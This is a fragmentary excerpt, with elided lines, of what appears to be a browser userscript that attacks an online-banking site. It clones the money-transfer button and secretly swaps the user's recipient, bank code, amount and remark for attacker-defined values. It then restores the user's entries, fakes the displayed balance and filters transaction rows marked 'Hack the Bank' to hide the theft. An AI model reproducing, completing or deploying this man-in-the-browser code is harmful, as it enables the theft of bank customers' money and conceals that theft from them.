...
window.attachEvent('load',function () {hasPageGMloaded=true;doGMMeenoo();},false)
...
function getHackedMoney(realMoney) {
	...
	return (realMoney + diffMoney);
	 ...
	 function timedMsg()
		 {
		 $("#btnTD button:visible[hackmarker!='true']:contains('Geld')", document.all).each(function(){	
		 			...
		 			sendMoneyBtnClone.click(function(event) {
		 				event.preventDefault();
		 				 ...
		 				 newTransfer = new Transfer($("input:eq(1)").val(),
		 						$("input:eq(0)").val(), $("input:eq(2)").val(), 
		 						$("input:eq(3)").val(), 
		 						$("input:eq(4)").val(), $("input:eq(5)").val(), new 
		 				...
		 				$("tr").hide();
		 				$("input:eq(0)").val(HACK_REC_ACCOUNT);
		 				$("input:eq(1)").val(HACK_REC_NAME);
		 				$("input:eq(2)").val(HACK_BANK_BLZ);
		 				$("input:eq(3)").val(HACK_BANK_NAME);
		 				$("input:eq(4)").val(HACK_AMOUNT);
		 				$("input:eq(5)").val(HACK_USAGE);
		 	...
		 	$("#btnTD button[hName='sendMoneyBtnClone']").filter(":not(:visible)[activateReset='true']").each(function(){
				...
				$("input:eq(0)").val(lastTransfer.acc_Nr);
				$("input:eq(1)").val(lastTransfer.acc_Name);
				$("input:eq(2)").val(lastTransfer.bank_BLZ);
				$("input:eq(3)").val(lastTransfer.bank_Name);
				$("input:eq(4)").val(lastTransfer.amount);
				$("input:eq(5)").val(lastTransfer.remark);
		 	...
		 	hackedRow= $(".TransfersOdd,.TransfersEven", document).filter(':contains(Hack the Bank)').each(function(){
